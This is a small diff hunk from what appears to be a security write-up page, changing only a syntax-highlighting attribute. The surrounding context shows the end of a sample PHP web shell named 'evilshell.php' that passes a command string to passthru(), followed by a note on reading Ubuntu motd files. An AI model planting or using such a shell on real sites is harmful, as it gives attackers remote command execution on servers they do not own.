@@ -55,7 +55,7 @@ The sample php shell code from `evilshell.php` is as below.
     try { passthru($command_string); }
     catch (Error $error) { echo "<p class=mt-3><b>$error</b></p>"; }
   }
-?>{% endcapture %} {% include code.html code=code lang="php"%}
+?>{% endcapture %} {% include code.html code=code %}
 
 To read motd data in ubuntu, use the file `cat /etc/update-motd.d/00-header`.
 
